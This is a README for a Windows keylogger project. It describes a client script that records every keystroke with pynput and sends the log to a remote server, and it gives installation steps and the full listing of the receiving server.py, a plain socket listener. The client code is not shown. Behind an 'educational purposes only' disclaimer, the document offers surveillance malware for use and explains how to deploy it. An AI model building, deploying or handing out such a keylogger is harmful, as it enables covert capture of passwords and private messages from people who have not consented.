 # Windows Keylogger Project

This project consists of a keylogger designed for Windows systems, split into two main scripts: `server.py` and `client.py`. The `client.py` script logs keystrokes on the client machine, while `server.py` is used to receive and handle the logged data on the server.

## ⚠️ Disclaimer

**This project is for educational purposes only. Unauthorized use of this software to monitor others without their consent is illegal and unethical. Ensure you have permission before using this software.**

## Features

- Logs all keystrokes on the client machine.
- Sends logged data to a remote server.
- Simple and easy to use.

## Requirements

- Python 3.x
- `pynput` library for capturing keystrokes
- `socket` library for network communication

## Installation

1. Clone the repository:
    ```bash
    git clone https://github.com/dan1471/keylogger.git
    cd keylogger-project
    ```

2. Install the required libraries:
    ```bash
    pip install pynput
    ```

## Usage

### Server

1. Run the `server.py` script on the server machine:
    ```bash
    python server.py
    ```

2. The server will start listening for incoming connections from the client.

### Client

1. Edit the `client.py` script to include the server's IP address and port.

2. Run the `client.py` script on the client machine:
    ```bash
    python client.py
    ```

3. The client will start logging keystrokes and send the data to the server.

## File Descriptions

- `server.py`: Script to run the server which receives logged keystrokes from the client.
- `client.py`: Script to run on the client machine which logs keystrokes and sends them to the server.

## Example

### Running the Server

```python
# server.py

import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 5000))  # Bind to all interfaces on port 5000
    server_socket.listen(1)
    print("Server started and listening for incoming connections...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address} has been established!")
        data = client_socket.recv(1024).decode('utf-8')
        print(f"Received data: {data}")
        client_socket.close()

if __name__ == "__main__":
    start_server()
